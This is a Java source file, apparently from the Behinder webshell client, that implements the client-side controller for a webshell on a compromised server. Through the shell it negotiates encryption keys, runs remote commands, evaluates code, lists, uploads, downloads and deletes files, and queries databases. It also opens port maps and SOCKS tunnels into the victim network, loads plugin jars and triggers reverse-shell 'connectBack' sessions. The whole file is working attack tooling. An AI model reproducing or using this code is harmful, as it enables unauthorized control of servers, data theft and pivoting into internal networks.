package net.rebeyond.behinder.core;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import net.rebeyond.behinder.utils.Utils;
import org.json.JSONObject;

import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.*;

public class ShellService {
    public static int BUFFSIZE = 46080;
    public static Map<String, Object> currentProxy;
    public int beginIndex = 0;
    public Map<String, String> currentHeaders;
    public String currentKey;
    public String currentPassword;
    public String currentType;
    public String currentUrl;
    public int encryptType = Constants.ENCRYPT_TYPE_AES;
    public int endIndex = 0;
    public JSONObject shellEntity;

    public ShellService(JSONObject shellEntity2, String userAgent) throws Exception {
        this.shellEntity = shellEntity2;
        this.currentUrl = shellEntity2.getString("url");
        this.currentType = shellEntity2.getString("type");
        this.currentPassword = shellEntity2.getString("password");
        this.currentHeaders = new HashMap();
        this.currentHeaders.put("User-Agent", userAgent);
        if (this.currentType.equals("php")) {
            this.currentHeaders.put("Content-type", "text/html;charset=utf-8");
        }
        mergeHeaders(this.currentHeaders, shellEntity2.getString("headers"));
    }

    public static void setProxy(Map<String, Object> proxy) {
        currentProxy = proxy;
    }

    public static Map<String, Object> getProxy(Map<String, Object> map) {
        return currentProxy;
    }

    public JSONObject getShellEntity() {
        return this.shellEntity;
    }

    private void mergeCookie(Map<String, String> headers, String cookie) {
        if (headers.containsKey("Cookie")) {
            headers.put("Cookie", headers.get("Cookie") + ";" + cookie);
            return;
        }
        headers.put("Cookie", cookie);
    }

    private void mergeHeaders(Map<String, String> headers, String headerTxt) {
        String[] split = headerTxt.split("\n");
        for (String line : split) {
            int semiIndex = line.indexOf(":");
            if (semiIndex > 0) {
                String key = formatHeaderName(line.substring(0, semiIndex));
                String value = line.substring(semiIndex + 1);
                if (!value.equals("")) {
                    headers.put(key, value);
                }
            }
        }
    }

    private String formatHeaderName(String beforeName) {
        String afterName = "";
        String[] split = beforeName.split("-");
        for (String element : split) {
            afterName = afterName + ((element.charAt(0) + "").toUpperCase() + element.substring(1).toLowerCase()) + "-";
        }
        if (afterName.length() - beforeName.length() != 1 || !afterName.endsWith("-")) {
            return afterName;
        }
        return afterName.substring(0, afterName.length() - 1);
    }

    public boolean doConnect() throws Exception {
        String content = UUID.randomUUID().toString();
        this.currentKey = Utils.getKey(this.currentPassword);
        try {
            return echo(content).getString("msg").equals(content);
        } catch (Exception e) {
            System.out.println("进入常规密钥协商流程");
            Map<String, String> keyAndCookie = Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders);
            String cookie = keyAndCookie.get("cookie");
            if ((cookie == null || cookie.equals("")) && !this.currentHeaders.containsKey("cookie")) {
                String urlWithSession = keyAndCookie.get("urlWithSession");
                if (urlWithSession != null) {
                    this.currentUrl = urlWithSession;
                }
                this.currentKey = Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders).get("key");
            } else {
                mergeCookie(this.currentHeaders, cookie);
                this.currentKey = keyAndCookie.get("key");
                if (this.currentType.equals("php") || this.currentType.equals("aspx")) {
                    this.beginIndex = Integer.parseInt(keyAndCookie.get("beginIndex"));
                    this.endIndex = Integer.parseInt(keyAndCookie.get("endIndex"));
                }
            }
            try {
                return echo(content).getString("msg").equals(content);
            } catch (Exception e2) {
                return false;
            }
        }
    }

    public String eval(String sourceCode) throws Exception {
        byte[] payload;
        if (this.currentType.equals("jsp")) {
            payload = Utils.getClassFromSourceCode(sourceCode);
        } else {
            payload = sourceCode.getBytes();
        }
        return new String((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getEvalData(this.currentKey, this.encryptType, this.currentType, payload), this.beginIndex, this.endIndex).get("data"));
    }

    public JSONObject runCmd(String cmd) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("cmd", cmd);
        JSONObject result = new JSONObject(new String(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "Cmd", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)).getBytes(StandardCharsets.UTF_8), StandardCharsets.UTF_8));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public JSONObject createBShell(String target, String localPort) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("action", "create");
        params.put("target", target);
        params.put("localPort", localPort);
        JSONObject result = new JSONObject(new String(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "BShell", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)).getBytes(StandardCharsets.UTF_8), StandardCharsets.UTF_8));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public JSONObject sendBShellCommand(String target, String action, String actionParams) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("action", action);
        params.put("target", target);
        params.put("params", actionParams);
        JSONObject result = new JSONObject(new String(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "BShell", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)).getBytes(StandardCharsets.UTF_8), StandardCharsets.UTF_8));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public JSONObject submitPluginTask(String taskID, String payloadPath, Map<String, String> pluginParams) throws Exception {
        byte[] pluginData = Utils.getPluginData(this.currentKey, this.encryptType, payloadPath, pluginParams, this.currentType);
        Map<String, String> params = new HashMap<>();
        params.put("taskID", taskID);
        params.put("action", "submit");
        params.put("payload", Base64.encode(pluginData));
        byte[] resData = (byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "Plugin", params, this.currentType), this.beginIndex, this.endIndex).get("data");
        FileOutputStream fos = new FileOutputStream("/Users/rebeyond/a.txt");
        fos.write(Base64.encode(pluginData).getBytes());
        fos.flush();
        fos.close();
        JSONObject result = new JSONObject(new String(new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType)).getBytes(StandardCharsets.UTF_8), StandardCharsets.UTF_8));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public JSONObject getPluginTaskResult(String taskID) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("taskID", taskID);
        params.put("action", "getResult");
        JSONObject result = new JSONObject(new String(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "Plugin", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)).getBytes(StandardCharsets.UTF_8), StandardCharsets.UTF_8));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public JSONObject loadJar(String libPath) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("libPath", libPath);
        JSONObject result = new JSONObject(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "Loader", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public JSONObject createRealCMD(String bashPath) throws Exception {
        JSONObject result;
        Map<String, String> params = new LinkedHashMap<>();
        params.put("type", "create");
        params.put("bashPath", bashPath);
        String resultTxt = new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType));
        if (!this.currentType.equals("php")) {
            result = new JSONObject(resultTxt);
        } else {
            result = new JSONObject();
            result.put("status", Base64.encode("success".getBytes()));
        }
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public JSONObject stopRealCMD() throws Exception {
        JSONObject result;
        Map<String, String> params = new LinkedHashMap<>();
        params.put("type", "stop");
        String resultTxt = new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType));
        if (!this.currentType.equals("php")) {
            result = new JSONObject(resultTxt);
        } else {
            result = new JSONObject();
            result.put("status", Base64.encode("success".getBytes()));
            result.put("msg", Base64.encode("msg".getBytes()));
        }
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public JSONObject readRealCMD() throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("type", "read");
        JSONObject result = new JSONObject(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public JSONObject writeRealCMD(String cmd) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("type", "write");
        if (this.currentType.equals("php")) {
            params.put("bashPath", "");
        }
        params.put("cmd", Base64.encode(cmd.getBytes()));
        JSONObject result = new JSONObject(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public JSONObject listFiles(String path) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "list");
        params.put("path", path);
        JSONObject result = new JSONObject(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public JSONObject deleteFile(String path) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "delete");
        params.put("path", path);
        JSONObject result = new JSONObject(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public JSONObject showFile(String path, String charset) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "show");
        params.put("path", path);
        if (this.currentType.equals("php")) {
            params.put("content", "");
        } else if (this.currentType.equals("asp")) {
        }
        if (charset != null) {
            params.put("charset", charset);
        }
        JSONObject result = new JSONObject(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public JSONObject renameFile(String oldName, String newName) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "rename");
        params.put("path", oldName);
        if (this.currentType.equals("php")) {
            params.put("content", "");
            params.put("charset", "");
        }
        params.put("newPath", newName);
        JSONObject result = new JSONObject(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public JSONObject createFile(String fileName) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "createFile");
        params.put("path", fileName);
        JSONObject result = new JSONObject(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public JSONObject createDirectory(String dirName) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "createDirectory");
        params.put("path", dirName);
        JSONObject result = new JSONObject(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public void downloadFile(String remotePath, String localPath) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "download");
        params.put("path", remotePath);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        FileOutputStream fso = new FileOutputStream(localPath);
        fso.write((byte[]) Utils.sendPostRequestBinary(this.currentUrl, this.currentHeaders, data).get("data"));
        fso.flush();
        fso.close();
    }

    public JSONObject execSQL(String type, String host, String port, String user, String pass, String database, String sql) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("type", type);
        params.put("host", host);
        params.put("port", port);
        params.put("user", user);
        params.put("pass", pass);
        params.put("database", database);
        params.put("sql", sql);
        JSONObject result = new JSONObject(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "Database", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public JSONObject uploadFile(String remotePath, byte[] fileContent, boolean useBlock) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        JSONObject result = null;
        if (!useBlock) {
            params.put("mode", "create");
            params.put("path", remotePath);
            params.put("content", Base64.encode(fileContent));
            result = new JSONObject(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)));
            for (String key : result.keySet()) {
                result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
            }
        } else {
            List<byte[]> blocks = Utils.splitBytes(fileContent, BUFFSIZE);
            for (int i = 0; i < blocks.size(); i++) {
                if (i == 0) {
                    params.put("mode", "create");
                } else {
                    params.put("mode", "append");
                }
                params.put("path", remotePath);
                params.put("content", Base64.encode(blocks.get(i)));
                result = new JSONObject(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)));
                for (String key2 : result.keySet()) {
                    result.put(key2, new String(Base64.decode(result.getString(key2)), StandardCharsets.UTF_8));
                }
            }
        }
        return result;
    }

    public JSONObject uploadFile(String remotePath, byte[] fileContent) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "create");
        params.put("path", remotePath);
        params.put("content", Base64.encode(fileContent));
        JSONObject result = new JSONObject(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public JSONObject appendFile(String remotePath, byte[] fileContent) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("mode", "append");
        params.put("path", remotePath);
        params.put("content", Base64.encode(fileContent));
        JSONObject result = new JSONObject(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public boolean createRemotePortMap(String targetIP, String targetPort, String remoteIP, String remotePort) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("action", "createRemote");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        if (this.currentType.equals("php")) {
            params.put("socketHash", "");
        }
        params.put("remoteIP", remoteIP);
        params.put("remotePort", remotePort);
        Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType), this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) result.get("data");
        if (!((Map) result.get("header")).get("status").equals("200")) {
            return false;
        }
        if (resData == null || resData.length < 4 || resData[0] != 55 || resData[1] != 33 || resData[2] != 73 || resData[3] != 54) {
            return true;
        }
        throw new Exception(new String(Arrays.copyOfRange(resData, 4, resData.length)));
    }

    public boolean createRemoteSocks(String targetIP, String targetPort, String remoteIP, String remotePort) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("action", "createRemote");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("remoteIP", remoteIP);
        params.put("remotePort", remotePort);
        Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType), this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) result.get("data");
        if (!((Map) result.get("header")).get("status").equals("200")) {
            return false;
        }
        if (resData == null || resData.length < 4 || resData[0] != 55 || resData[1] != 33 || resData[2] != 73 || resData[3] != 54) {
            return true;
        }
        throw new Exception(new String(Arrays.copyOfRange(resData, 4, resData.length)));
    }

    public boolean createPortMap(String targetIP, String targetPort, String socketHash) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("action", "createLocal");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType), this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) result.get("data");
        if (!((Map) result.get("header")).get("status").equals("200")) {
            return false;
        }
        if (resData == null || resData.length < 4 || resData[0] != 55 || resData[1] != 33 || resData[2] != 73 || resData[3] != 54) {
            return true;
        }
        throw new Exception(new String(Arrays.copyOfRange(resData, 4, resData.length)));
    }

    public byte[] readPortMapData(String targetIP, String targetPort, String socketHash) throws Exception {
        byte[] resData;
        Map<String, String> params = new LinkedHashMap<>();
        params.put("action", "read");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        try {
            Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType), this.beginIndex, this.endIndex);
            Map<String, String> resHeader = (Map) result.get("header");
            if (resHeader.get("status").equals("200")) {
                resData = (byte[]) result.get("data");
                if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
                    resData = null;
                } else {
                    if (resHeader.containsKey("server") && resHeader.get("server").indexOf("Apache-Coyote/1.1") > 0) {
                        resData = Arrays.copyOfRange(resData, 0, resData.length - 1);
                    }
                    if (resData == null) {
                        resData = new byte[0];
                    }
                }
            } else {
                resData = null;
            }
            return resData;
        } catch (Exception e) {
            byte[] exceptionByte = e.getMessage().getBytes();
            if (exceptionByte[0] == 55 && exceptionByte[1] == 33 && exceptionByte[2] == 73 && exceptionByte[3] == 54) {
                return null;
            }
            throw e;
        }
    }

    public boolean writePortMapData(byte[] proxyData, String targetIP, String targetPort, String socketHash) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("action", "write");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        if (this.currentType.equals("php")) {
            params.put("remoteIP", "");
            params.put("remotePort", "");
        }
        params.put("extraData", Base64.encode(proxyData));
        Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType), this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) result.get("data");
        if (!((Map) result.get("header")).get("status").equals("200")) {
            return false;
        }
        if (resData == null || resData.length < 4 || resData[0] != 55 || resData[1] != 33 || resData[2] != 73 || resData[3] != 54) {
            return true;
        }
        Arrays.copyOfRange(resData, 4, resData.length);
        return false;
    }

    public boolean closeLocalPortMap(String targetIP, String targetPort) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("action", "closeLocal");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        return ((Map) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType), this.beginIndex, this.endIndex).get("header")).get("status").equals("200");
    }

    public boolean closeRemotePortMap() throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("action", "closeRemote");
        return ((Map) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType), this.beginIndex, this.endIndex).get("header")).get("status").equals("200");
    }

    public byte[] readProxyData() throws Exception {
        byte[] resData;
        Map<String, String> params = new LinkedHashMap<>();
        params.put("cmd", "READ");
        try {
            Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType), this.beginIndex, this.endIndex);
            Map<String, String> resHeader = (Map) result.get("header");
            if (resHeader.get("status").equals("200")) {
                resData = (byte[]) result.get("data");
                if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
                    resData = null;
                } else {
                    if (resHeader.containsKey("server") && resHeader.get("server").indexOf("Apache-Coyote/1.1") > 0) {
                        resData = Arrays.copyOfRange(resData, 0, resData.length - 1);
                    }
                    if (resData == null) {
                        resData = new byte[0];
                    }
                }
            } else {
                resData = null;
            }
            return resData;
        } catch (Exception e) {
            byte[] exceptionByte = e.getMessage().getBytes();
            if (exceptionByte[0] == 55 && exceptionByte[1] == 33 && exceptionByte[2] == 73 && exceptionByte[3] == 54) {
                return null;
            }
            throw e;
        }
    }

    public boolean writeProxyData(byte[] proxyData) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("cmd", "FORWARD");
        params.put("targetIP", "");
        params.put("targetPort", "");
        params.put("extraData", Base64.encode(proxyData));
        Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType), this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) result.get("data");
        if (!((Map) result.get("header")).get("status").equals("200")) {
            return false;
        }
        if (resData == null || resData.length < 4 || resData[0] != 55 || resData[1] != 33 || resData[2] != 73 || resData[3] != 54) {
            return true;
        }
        Arrays.copyOfRange(resData, 4, resData.length);
        return false;
    }

    public boolean closeProxy() throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("cmd", "DISCONNECT");
        return ((Map) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType), this.beginIndex, this.endIndex).get("header")).get("status").equals("200");
    }

    public boolean openProxy(String destHost, String destPort) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("cmd", "CONNECT");
        params.put("targetIP", destHost);
        params.put("targetPort", destPort);
        Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType), this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) result.get("data");
        if (!((Map) result.get("header")).get("status").equals("200")) {
            return false;
        }
        if (resData == null || resData.length < 4 || resData[0] != 55 || resData[1] != 33 || resData[2] != 73 || resData[3] != 54) {
            return true;
        }
        Arrays.copyOfRange(resData, 4, resData.length);
        return false;
    }

    public JSONObject echo(String content) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("content", content);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "Echo", params, this.currentType), this.beginIndex, this.endIndex);
        Map<String, String> responseHeader = (Map) resultObj.get("header");
        String cookieValue = "";
        for (String headerName : responseHeader.keySet()) {
            if (headerName != null && headerName.equalsIgnoreCase("Set-Cookie")) {
                cookieValue = responseHeader.get(headerName);
            }
        }
        mergeCookie(this.currentHeaders, cookieValue);
        JSONObject result = new JSONObject(new String(new String(Crypt.Decrypt((byte[]) resultObj.get("data"), this.currentKey, this.encryptType, this.currentType)).getBytes(StandardCharsets.UTF_8), StandardCharsets.UTF_8));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }

    public String getBasicInfo() throws Exception {
        byte[] resData = (byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "BasicInfo", new LinkedHashMap<>(), this.currentType), this.beginIndex, this.endIndex).get("data");
        try {
            return new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        } catch (Exception e) {
            e.printStackTrace();
            throw new Exception("请求失败:" + new String(resData, StandardCharsets.UTF_8));
        }
    }

    public void keepAlive() throws Exception {
        while (true) {
            try {
                Thread.sleep((new Random().nextInt(5) + 5) * 60 * 1000);
                getBasicInfo();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public JSONObject connectBack(String type, String ip, String port) throws Exception {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("type", type);
        params.put("ip", ip);
        params.put("port", port);
        JSONObject result = new JSONObject(new String(Crypt.Decrypt((byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "ConnectBack", params, this.currentType), this.beginIndex, this.endIndex).get("data"), this.currentKey, this.encryptType, this.currentType)));
        for (String key : result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), StandardCharsets.UTF_8));
        }
        return result;
    }
}
